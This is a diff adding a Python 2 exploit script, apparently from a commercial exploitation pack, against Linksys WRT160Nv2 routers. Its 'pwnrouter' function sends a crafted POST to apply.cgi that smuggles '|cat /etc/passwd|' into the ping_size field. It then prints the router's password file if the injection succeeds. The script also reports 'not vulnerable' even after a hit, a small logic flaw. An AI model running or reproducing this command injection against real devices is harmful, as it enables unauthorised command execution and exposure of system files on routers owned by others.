@@ -1,0 +1,52 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+
+_name_   = 'd2sec_linksys_3'
+_vendor_ = 'linksys'
+_model_  = ['WRT160Nv2']
+_vuln_   = 'OS Command Injection'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  url = 'http://%s/apply.cgi' % host
+  try:
+    nfo = cStringIO.StringIO()
+    c = pycurl.Curl()
+    c.setopt(pycurl.URL, url)
+    c.setopt(pycurl.POST, 1)
+    c.setopt(pycurl.POSTFIELDS, 'submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&ping_ip=1.1.1.1&ping_size=|cat%20/etc/passwd|&ping_times=5&traceroute_ip=')
+    c.setopt(pycurl.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+    c.setopt(pycurl.WRITEFUNCTION, nfo.write)
+    c.perform()
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  status = c.getinfo(pycurl.HTTP_CODE)
+  if status == 200:
+    data = nfo.getvalue()
+    if 'root:' in data:
+      print '[+] %s vulnerable: %s\n\n' % (host, url)
+      print data
+  print '[+] %s not vulnerable: %s' % (host, url)
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
